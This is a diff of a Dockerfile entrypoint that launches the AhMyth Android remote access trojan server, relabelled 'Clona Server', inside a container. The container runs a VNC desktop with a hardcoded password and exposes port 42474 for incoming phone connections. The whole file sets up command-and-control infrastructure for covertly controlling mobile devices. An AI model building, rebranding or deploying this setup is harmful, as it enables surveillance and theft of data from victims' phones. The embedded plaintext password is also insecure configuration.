@@ -41,19 +41,15 @@ export DISPLAY=:99\n\
 # 2. Iniciar administrador de ventanas\n\
 fluxbox &\n\
 \n\
-# 3. Iniciar servidor VNC - Escuchar en 0.0.0.0 para acceso externo RealVNC con optimizaciones\n\
-x11vnc -display :99 -forever -passwd "clona123" -listen 0.0.0.0 -rfbport 5900 -noxdamage -shared -repeat &\n\
+# 3. Iniciar servidor VNC exclusivo para acceso RealVNC Directo (Puerto 5900)
+# Usamos -rfbport 5900, -shared, -noxdamage y -repeat
+x11vnc -display :99 -forever -passwd "clona123" -rfbport 5900 -shared -noxdamage -repeat &\n\
 \n\
-# 4. Iniciar bridge para ver en el navegador (Puerto 9000)\n\
-websockify --web /usr/share/novnc 9000 localhost:5900 &\n\
-\n\
-# 5. Iniciar el servidor de AhMyth\n\
-echo "Iniciando AhMyth Server..."\n\
+# 4. Iniciar el servidor de AhMyth (Sin websockify)
+echo "Iniciando Clona Server..."\n\
 electron /app --no-sandbox\n' > /entrypoint.sh && chmod +x /entrypoint.sh
 
-# Puerto 9000: Panel web (noVNC)
-# Puerto 42474: Conexiones de celulares
-# Puerto 5900: VNC directo
-EXPOSE 9000 42474 5900
+# Puertos: 42474 (Celulares) y 5900 (RealVNC)
+EXPOSE 42474 5900
 
 CMD ["/entrypoint.sh"]
